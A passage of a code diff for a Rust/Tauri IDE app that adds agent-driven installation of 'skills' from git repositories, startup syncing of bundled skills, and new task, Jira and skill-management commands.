+{{\"installed\":true|false,\"id\":\"<id>\",\"name\":\"<name>\",\"reason\":\"<short>\"}}"
+    );
+
+    // Generous bound: clone + reasoning + file copy.
+    let raw = tauri::async_runtime::spawn_blocking(move || judge::run_autonomous(&prompt, 240))
+        .await
+        .map_err(|e| e.to_string())??;
+
+    // Parse the trailing JSON verdict.
+    let (Some(s), Some(e)) = (raw.rfind('{'), raw.rfind('}')) else {
+        return Err("Couldn't confirm the install (no result from the agent).".into());
+    };
+    if e < s {
+        return Err("Couldn't confirm the install (garbled result).".into());
+    }
+    let v: serde_json::Value =
+        serde_json::from_str(&raw[s..=e]).map_err(|_| "Couldn't parse the install result.".to_string())?;
+    let installed = v.get("installed").and_then(|b| b.as_bool()).unwrap_or(false);
+    let name = v.get("name").and_then(|x| x.as_str()).unwrap_or("").trim().to_string();
+    let reason = v.get("reason").and_then(|x| x.as_str()).unwrap_or("").trim().to_string();
+    if installed {
+        let label = if name.is_empty() { "Skill".to_string() } else { name };
+        Ok(format!("Installed “{label}”.{}", if reason.is_empty() { String::new() } else { format!(" {reason}") }))
+    } else {
+        Err(if reason.is_empty() { "The repo isn't a valid/safe skill.".into() } else { reason })
+    }
 }
 
 /// Markdown summary of activity for a given day (defaults to today). Honors the
@@ -798,7 +1591,12 @@ pub fn run() {
                 .expect("app data dir");
             std::fs::create_dir_all(&dir).ok();
             app.manage(Store::load(dir.join("eterm-ide.json")));
-            app.manage(SettingsStore::load(dir.join("settings.json")));
+            let settings_store = SettingsStore::load(dir.join("settings.json"));
+            // Install bundled skills (minus any the user disabled) into the
+            // global skills dirs so every agent CLI inherits them — including a
+            // fresh install getting the default-on skills on first launch.
+            skills::sync(&settings_store.skills_disabled());
+            app.manage(settings_store);
 
             // Native window menu. File: Open Project / New Window / Home / Quit,
             // plus an Edit submenu (predefined items) so macOS shortcuts work.
@@ -869,7 +1667,26 @@ pub fn run() {
             all_tasks,
             assign_task,
             update_task,
+            plan_tasks,
+            set_task_description,
+            set_task_steps,
+            update_step,
+            breakdown_task,
+            ingest_agent_tasks,
+            auto_assign_tasks,
+            link_task_agent,
             delete_task,
+            append_task_note,
+            check_duplicate_task,
+            jira_config_get,
+            jira_config_set,
+            jira_disconnect,
+            jira_test,
+            jira_sync,
+            jira_my_issues,
+            jira_import,
+            jira_create_from_task,
+            jira_projects,
             read_dir,
             read_file,
             write_file,
@@ -901,6 +1718,10 @@ pub fn run() {
             open_window,
             get_settings,
             set_daily_summary,
+            list_skills,
+            set_skill_enabled,
+            remove_skill,
+            install_skill_from_git,
             daily_summary,
             daily_summary_ai,
             summary_dates,
